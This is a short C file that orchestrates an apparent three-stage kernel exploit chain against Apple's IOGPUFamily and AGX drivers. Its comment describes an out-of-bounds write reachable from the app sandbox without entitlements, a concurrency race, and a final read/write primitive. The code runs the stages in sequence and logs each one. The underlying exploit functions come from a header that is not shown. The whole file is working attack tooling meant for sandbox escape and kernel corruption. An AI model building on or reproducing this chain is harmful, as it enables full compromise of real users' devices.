/* chain.c — dj's order, one button:
   stage 1 = ESCAPE PIECE: IOGPUFamily OOB probe (the kernel-corruption
             candidate reachable from the app sandbox; hit = writes past
             arrayC bounds via [obj+40] capacity, no entitlements needed)
   stage 2 = GONKA: KeyStore/AGX concurrent dispatch race
   stage 3 = OOB RW: IOGPUFamily OOB again, deep pass.
   Chain stops on stage 1 death; each stage logs an explicit done line. */
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include "exploit.h"

void nk_chain_run(void) {
    nk_filelog_open("chain");
    nk_log("[esc] stage 1: IOGPU OOB (pivot out of sandbox)");
    nk_iogpu_oob_run();
    nk_log("[esc] stage 1 done -> stage 2: race");
    fflush(stdout);
    nk_racer_run();
    nk_log("[run] stage 2 done -> stage 3: IOGPU OOB deep");
    fflush(stdout);
    sleep(3);
    nk_iogpu_oob_run();
    nk_log("[run] stage 3 done -> rw");
    nk_filelog_close();
}
